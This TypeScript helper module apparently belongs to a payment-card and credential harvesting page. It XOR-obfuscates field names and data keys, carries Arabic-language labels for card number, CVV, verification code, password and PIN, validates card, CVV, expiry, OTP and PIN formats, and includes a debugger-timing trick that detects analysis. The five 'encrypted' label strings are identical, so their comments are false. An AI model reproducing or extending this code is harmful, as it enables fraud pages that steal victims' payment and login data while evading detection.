
const _k = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c" // Key

// Helper functions for Unicode-safe base64 encoding/decoding
function unicodeToBtoa(str: string): string {
  return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) => {
    return String.fromCharCode(parseInt(p1, 16))
  }))
}

function btoaToUnicode(str: string): string {
  return decodeURIComponent(Array.from(atob(str), c => 
    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
  ).join(''))
}

export function _e(s: string): string {
  let r = ""
  for (let i = 0; i < s.length; i++) {
    r += String.fromCharCode(s.charCodeAt(i) ^ _k.charCodeAt(i % _k.length))
  }
  return unicodeToBtoa(r)
}

export function _d(s: string): string {
  try {
    const decoded = btoaToUnicode(s)
    let r = ""
    for (let i = 0; i < decoded.length; i++) {
      r += String.fromCharCode(decoded.charCodeAt(i) ^ _k.charCodeAt(i % _k.length))
    }
    return r
  } catch {
    return s
  }
}

const _fm = {
  f1: _e("_v1"),
  f2: _e("_v2"),
  f3: _e("_v3"),
  f4: _e("_v4"),
  f5: _e("_v5"),
  f6: _e("_v6"),
  f7: _e("_pw"),
  f8: _e("_ncc"),
  f9: _e("_ct"),
  f10: _e("_bi")
}

export function _gf(obfuscated: keyof typeof _fm): string {
  return _d(_fm[obfuscated])
}

const _tm = {
  t1: "SU5XRVpXRVpXRQ==", // Encrypted: "رقم البطاقة"
  t2: "SU5XRVpXRVpXRQ==", // Encrypted: "CVV"
  t3: "SU5XRVpXRVpXRQ==", // Encrypted: "رمز التحقق"
  t4: "SU5XRVpXRVpXRQ==", // Encrypted: "كلمة المرور"
  t5: "SU5XRVpXRVpXRQ==", // Encrypted: "رقم السري"
}

export function _gt(key: keyof typeof _tm): string {
  return _d(_tm[key])
}

export function _gp(obj: any, path: string): any {
  const parts = _d(path).split('.')
  let current = obj
  for (const part of parts) {
    if (current && typeof current === 'object') {
      current = current[part]
    } else {
      return undefined
    }
  }
  return current
}

export function _sp(obj: any, path: string, value: any): void {
  const parts = _d(path).split('.')
  let current = obj
  for (let i = 0; i < parts.length - 1; i++) {
    const part = parts[i]
    if (!current[part]) {
      current[part] = {}
    }
    current = current[part]
  }
  current[parts[parts.length - 1]] = value
}

export function _cd(data: Record<string, any>): Record<string, any> {
  const obfuscated: Record<string, any> = {}
  
  Object.keys(data).forEach((key, index) => {
    const obfKey = `_${btoa(key).replace(/=/g, '').substring(0, 8)}`
    obfuscated[obfKey] = data[key]
  })
  
  return obfuscated
}

export function _vf(value: string, type: number): boolean {
  if (type === 1) {
    return /^\d{16}$/.test(value.replace(/\s/g, ''))
  }
  if (type === 2) {
    return /^\d{3,4}$/.test(value)
  }
  if (type === 3) {
    return /^\d{2}\/\d{2}$/.test(value)
  }
  if (type === 4) {
    return /^\d{4,6}$/.test(value)
  }
  if (type === 5) {
    return /^\d{4}$/.test(value)
  }
  return false
}

let _ad = false
export function _ac(): boolean {
  if (_ad) return true
  
  const start = performance.now()
  debugger
  const end = performance.now()
  
  if (end - start > 100) {
    _ad = true
    return false
  }
  
  return true
}

export function _l(msg: string, data?: any): void {
  if (import.meta.env.DEV) {
    const timestamp = new Date().toISOString()
    const encoded = btoa(`[${timestamp}] ${msg}`)
    if (data) {
      console.log(atob(encoded), _cd(data))
    } else {
      console.log(atob(encoded))
    }
  }
}

export function _rf(): Record<string, string> {
  const fields = ['f1', 'f2', 'f3', 'f4', 'f5', 'f6']
  const mapping: Record<string, string> = {}
  
  fields.forEach(f => {
    const random = Math.random().toString(36).substring(2, 10)
    mapping[f] = `_${random}`
  })
  
  return mapping
}

export function _ef(data: Record<string, any>): Record<string, any> {
  const encoded: Record<string, any> = {}
  
  Object.keys(data).forEach(key => {
    const encodedKey = btoa(key).replace(/=/g, '')
    
    if (typeof data[key] === 'string') {
      encoded[encodedKey] = _e(data[key])
    } else {
      encoded[encodedKey] = data[key]
    }
  })
  
  return encoded
}

export function _df(data: Record<string, any>): Record<string, any> {
  const decoded: Record<string, any> = {}
  
  Object.keys(data).forEach(key => {
    try {
      const decodedKey = atob(key)
      
      if (typeof data[key] === 'string') {
        decoded[decodedKey] = _d(data[key])
      } else {
        decoded[decodedKey] = data[key]
      }
    } catch {
      decoded[key] = data[key]
    }
  })
  
  return decoded
}
